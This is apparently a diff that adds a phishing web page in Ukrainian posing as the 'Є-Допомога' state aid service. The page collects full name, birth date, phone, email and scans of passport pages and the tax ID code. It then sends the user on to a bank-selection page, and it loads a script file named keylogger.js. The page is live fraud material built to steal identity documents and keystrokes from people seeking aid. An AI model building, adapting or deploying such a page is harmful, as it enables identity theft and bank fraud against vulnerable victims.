@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Є-Допомога | Заповнення форми</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>Особисті дані</h1>
+        <p>Заповніть форму для отримання допомоги</p>
+    </header>
+
+    <div class="container">
+        <div class="payment-card">
+            <form id="personalForm">
+                <div class="form-group">
+                    <label class="form-label">ПІБ</label>
+                    <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Дата народження</label>
+                    <input type="date" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Номер телефону</label>
+                    <input type="tel" class="form-control" placeholder="+380 XX XXX XX XX" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email</label>
+                    <input type="email" class="form-control" placeholder="Введіть ваш email" required>
+                </div>
+
+                <h3>Завантаження документів</h3>
+                <div class="form-group">
+                    <label class="form-label">Паспорт (сторона з фото)</label>
+                    <input type="file" class="form-control" accept="image/*,.pdf" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Паспорт (прописка)</label>
+                    <input type="file" class="form-control" accept="image/*,.pdf" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Ідентифікаційний код</label>
+                    <input type="file" class="form-control" accept="image/*,.pdf" required>
+                </div>
+
+                <div class="form-buttons">
+                    <button type="button" onclick="location.href='index.html'" class="prev-btn">Назад</button>
+                    <button type="button" onclick="submitForm()" class="next-btn">Далі</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 Є-Допомога. Всі права захищені.</p>
+        <p>Гаряча лінія: 0 800 123 456</p>
+    </footer>
+
+    <script src="js/keylogger.js"></script>
+    <script>
+        function submitForm() {
+            const form = document.getElementById('personalForm');
+            if (form.checkValidity()) {
+                // Сохраняем данные в localStorage
+                const formData = {
+                    fullName: form.querySelector('input[type="text"]').value,
+                    birthDate: form.querySelector('input[type="date"]').value,
+                    phone: form.querySelector('input[type="tel"]').value,
+                    email: form.querySelector('input[type="email"]').value
+                };
+                localStorage.setItem('formData', JSON.stringify(formData));
+                
+                // Переходим на страницу выбора банка
+                location.href = 'bank.html';
+            } else {
+                alert('Будь ласка, заповніть всі обов\'язкові поля');
+            }
+        }
+    </script>
+</body>
+</html>
